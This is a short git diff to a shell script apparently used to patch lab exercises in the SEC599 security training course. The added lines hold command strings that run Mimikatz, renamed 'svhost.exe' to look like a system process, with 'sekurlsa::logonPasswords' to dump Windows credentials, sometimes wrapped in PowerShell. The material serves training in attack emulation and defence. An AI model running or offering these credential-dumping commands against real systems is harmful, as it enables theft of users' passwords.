8fdeb1d372a941e794440c720b9c87d6adfe79f4
Erik Van Buggenhout <evanbuggenhout@nviso.be>
2019-08-30 08:43:46 -0400

    Update kali-DTF-execute.sh

--- kali-DTF-execute.sh
+++ kali-DTF-execute.sh
@@ -2,3 +2,8 @@
 # --------------------------------------
 # Last update: 30 January 2019
 # This script is used for emergency patches / updates in SEC599
+
+sed -i 's/-x \'C:\\Users\\dwight.schrute\\Downloads\svhost.exe privilege::debug sekurlsa::logonPasswords exit\'/-x \'powershell.exe -Command "C:\\Users\\dwight.schrute\\Downloads\svhost.exe sekurlsa::logonPasswords exit"\'/g
+
+-x 'C:\\Users\\alan.marshall\\Downloads\svhost.exe privilege::debug sekurlsa::logonPasswords exit'
+-x 'powershell.exe -Command "C:\\Users\\alan.marshall\\Downloads\svhost.exe sekurlsa::logonPasswords exit"'
